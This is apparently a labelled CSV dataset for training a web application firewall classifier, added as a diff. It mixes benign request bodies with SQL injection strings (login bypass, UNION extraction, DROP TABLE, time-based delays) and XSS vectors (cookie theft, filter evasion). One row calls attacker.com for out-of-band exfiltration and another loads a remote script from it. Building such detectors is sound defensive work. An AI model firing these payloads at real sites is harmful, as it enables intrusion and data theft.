@@ -1,0 +1,76 @@
+payload,label
+"{""query_params"":{},""body_params"":{""user"":""alice_99"",""action"":""view_profile"",""page"":1}}",Normal
+"{""query_params"":{},""body_params"":{""search"":""laptop dell xps 15"",""category"":""electronics"",""sort"":""asc""}}",Normal
+"{""query_params"":{},""body_params"":{""email"":""nguyen.van.a@gmail.com"",""role"":""student"",""status"":""active""}}",Normal
+"{""query_params"":{},""body_params"":{""item_id"":1024,""quantity"":2,""coupon"":""SUMMER2026""}}",Normal
+"{""query_params"":{},""body_params"":{""title"":""Báo cáo tiến độ"",""content"":""Đã cập nhật hệ thống honeypot.""}}",Normal
+"{""query_params"":{},""body_params"":{""username"":""chinh_nguyen"",""remember_me"":true,""device"":""Windows 11""}}",Normal
+"{""query_params"":{},""body_params"":{""filter_by"":""status"",""value"":""completed"",""limit"":50}}",Normal
+"{""query_params"":{},""body_params"":{""product_name"":""Bàn phím cơ AKKO"",""price_range"":[1000000,2000000]}}",Normal
+"{""query_params"":{},""body_params"":{""comment"":""Bài viết rất hay và hữu ích!"",""post_id"":888}}",Normal
+"{""query_params"":{},""body_params"":{""settings"":{""theme"":""dark"",""notifications"":true,""language"":""vi""}}}",Normal
+"{""query_params"":{},""body_params"":{""order_id"":""ORD-2026-9901"",""payment_method"":""MOMO""}}",Normal
+"{""query_params"":{},""body_params"":{""api_key"":""abc123xyz890"",""service"":""data_sync""}}",Normal
+"{""query_params"":{},""body_params"":{""feedback"":""Giao diện mượt mà, dễ sử dụng."",""rating"":5}}",Normal
+"{""query_params"":{},""body_params"":{""user_id"":405,""avatar_url"":""https://example.com/avatar.png""}}",Normal
+"{""query_params"":{},""body_params"":{""query"":""thuật toán RandomForest"",""type"":""article""}}",Normal
+"{""query_params"":{},""body_params"":{""task_name"":""Huấn luyện mô hình WAF"",""priority"":""high""}}",Normal
+"{""query_params"":{},""body_params"":{""location"":""Da Nang"",""latitude"":16.0544,""longitude"":108.2022}}",Normal
+"{""query_params"":{},""body_params"":{""file_name"":""document_v1.pdf"",""size_kb"":2048}}",Normal
+"{""query_params"":{},""body_params"":{""tag"":[""security"",""ai"",""machine-learning""]}}",Normal
+"{""query_params"":{},""body_params"":{""event"":""user_login"",""timestamp"":1772500000}}",Normal
+"{""query_params"":{},""body_params"":{""bio"":""Sinh viên ngành An ninh mạng Đại học Duy Tân""}}",Normal
+"{""query_params"":{},""body_params"":{""shipping_address"":""Cẩm Lệ, Đà Nẵng"",""phone"":""0905123456""}}",Normal
+"{""query_params"":{},""body_params"":{""message"":""Chào bạn, mình cần hỗ trợ kỹ thuật.""}}",Normal
+"{""query_params"":{},""body_params"":{""course"":""An toàn thông tin"",""credit"":3}}",Normal
+"{""query_params"":{},""body_params"":{""metadata"":{""version"":""1.0.2"",""env"":""production""}}}",Normal
+"{""query_params"":{},""body_params"":{""username"":""admin' OR '1'='1"",""password"":""123""}}",SQLi
+"{""query_params"":{},""body_params"":{""search"":""laptop' UNION SELECT username, password FROM users--"",""category"":""all""}}",SQLi
+"{""query_params"":{},""body_params"":{""id"":""1; DROP TABLE users;--"",""action"":""delete""}}",SQLi
+"{""query_params"":{},""body_params"":{""query"":""1' AND 1=1--"",""filter"":""active""}}",SQLi
+"{""query_params"":{},""body_params"":{""user_id"":""' OR 1=1 #"",""token"":""abc123xyz""}}",SQLi
+"{""query_params"":{},""body_params"":{""username"":""admin'--"",""password"":""any_password""}}",SQLi
+"{""query_params"":{},""body_params"":{""id"":""1' AND SLEEP(5)--"",""action"":""check""}}",SQLi
+"{""query_params"":{},""body_params"":{""search"":""' UNION SELECT NULL, version(), NULL--"",""page"":1}}",SQLi
+"{""query_params"":{},""body_params"":{""filter"":""1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--""}}",SQLi
+"{""query_params"":{},""body_params"":{""order_by"":""id ASC, (SELECT 1 FROM (SELECT SLEEP(5))a)""}}",SQLi
+"{""query_params"":{},""body_params"":{""username"":""\"" OR \""1\""=\""1"",""password"":""pass""}}",SQLi
+"{""query_params"":{},""body_params"":{""search"":""' OR username LIKE '%"",""type"":""wildcard""}}",SQLi
+"{""query_params"":{},""body_params"":{""id"":""1'/**/OR/**/1=1--"",""status"":""test""}}",SQLi
+"{""query_params"":{},""body_params"":{""user_id"":""1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--""}}",SQLi
+"{""query_params"":{},""body_params"":{""comment"":""test' HAVING 1=1--"",""post_id"":10}}",SQLi
+"{""query_params"":{},""body_params"":{""token"":""0x27204f5220313d31"",""type"":""hex""}}",SQLi
+"{""query_params"":{},""body_params"":{""search"":""' UNION SELECT sqlite_version(), NULL--"",""source"":""db""}}",SQLi
+"{""query_params"":{},""body_params"":{""user"":""' OR 'a'='a"",""login"":""true""}}",SQLi
+"{""query_params"":{},""body_params"":{""id"":""1' OR ISNULL(1)=0--"",""mode"":""strict""}}",SQLi
+"{""query_params"":{},""body_params"":{""query"":""' AND SUBSTRING(version(),1,1)='8'--"",""check"":""v8""}}",SQLi
+"{""query_params"":{},""body_params"":{""payload"":""' OR (SELECT LOAD_FILE('\\\\\\\\attacker.com\\\\a'))--""}}",SQLi
+"{""query_params"":{},""body_params"":{""user"":""admin' AND '1'='1"",""role"":""admin""}}",SQLi
+"{""query_params"":{},""body_params"":{""id"":""1'||'1'='1"",""debug"":""true""}}",SQLi
+"{""query_params"":{},""body_params"":{""search"":""' AND BENCHMARK(5000000,MD5(1))--"",""speed"":""slow""}}",SQLi
+"{""query_params"":{},""body_params"":{""id"":""1 AND 1=(SELECT COUNT(*) FROM users)"",""type"":""subquery""}}",SQLi
+"{""query_params"":{},""body_params"":{""comment"":""<script>alert('XSS')</script>"",""post_id"":101}}",XSS
+"{""query_params"":{},""body_params"":{""username"":""<img src=x onerror=alert(document.cookie)>"",""bio"":""hello""}}",XSS
+"{""query_params"":{},""body_params"":{""search"":""<svg/onload=alert(1)>"",""page"":1}}",XSS
+"{""query_params"":{},""body_params"":{""profile_name"":""javascript:alert('XSS')"",""status"":""updating""}}",XSS
+"{""query_params"":{},""body_params"":{""feedback"":""<body onload=alert('XSS')>"",""rating"":5}}",XSS
+"{""query_params"":{},""body_params"":{""input"":""<input autofocus onfocus=alert(1)>"",""form"":""login""}}",XSS
+"{""query_params"":{},""body_params"":{""comment"":""<details open ontoggle=alert(1)>"",""post_id"":200}}",XSS
+"{""query_params"":{},""body_params"":{""url"":""<iframe src=\""javascript:alert(1)\""></iframe>""}}",XSS
+"{""query_params"":{},""body_params"":{""audio"":""<audio src=x onerror=alert(1)>"",""type"":""sound""}}",XSS
+"{""query_params"":{},""body_params"":{""video"":""<video><source onerror=alert(1)></video>""}}",XSS
+"{""query_params"":{},""body_params"":{""select"":""<select autofocus onfocus=alert(1)></select>""}}",XSS
+"{""query_params"":{},""body_params"":{""script"":""<script src=\""http://attacker.com/xss.js\""></script>""}}",XSS
+"{""query_params"":{},""body_params"":{""svg"":""<svg><animate onend=alert(1) attributeName=x dur=1s>""}}",XSS
+"{""query_params"":{},""body_params"":{""obfuscated"":""<iMg sRc=x oNeRroR=alert(1)>"",""tag"":""test""}}",XSS
+"{""query_params"":{},""body_params"":{""encoded"":""\\u003cscript\\u003ealert(1)\\u003c/script\\u003e""}}",XSS
+"{""query_params"":{},""body_params"":{""style"":""<div style=\""background-image: url(javascript:alert(1))\"">""}}",XSS
+"{""query_params"":{},""body_params"":{""math"":""<math><maction actiontype=\""statusline\"" xlink:href=\""javascript:alert(1)\"">click</maction></math>""}}",XSS
+"{""query_params"":{},""body_params"":{""comment"":""<script>prompt(1)</script>"",""status"":""pending""}}",XSS
+"{""query_params"":{},""body_params"":{""bio"":""<script>confirm(document.domain)</script>""}}",XSS
+"{""query_params"":{},""body_params"":{""object"":""<object data=\""javascript:alert(1)\"">""}}",XSS
+"{""query_params"":{},""body_params"":{""embed"":""<embed src=\""javascript:alert(1)\"">""}}",XSS
+"{""query_params"":{},""body_params"":{""eval"":""<script>eval(atob('YWxlcnQoMSk='))</script>""}}",XSS
+"{""query_params"":{},""body_params"":{""link"":""<a href=\""#\"" onmouseover=alert(1)>Hover me</a>""}}",XSS
+"{""query_params"":{},""body_params"":{""img"":""<img src=a onerror=confirm(1)>"",""alt"":""image""}}",XSS
+"{""query_params"":{},""body_params"":{""marquee"":""<marquee onstart=alert(1)>Alert XSS</marquee>""}}",XSS
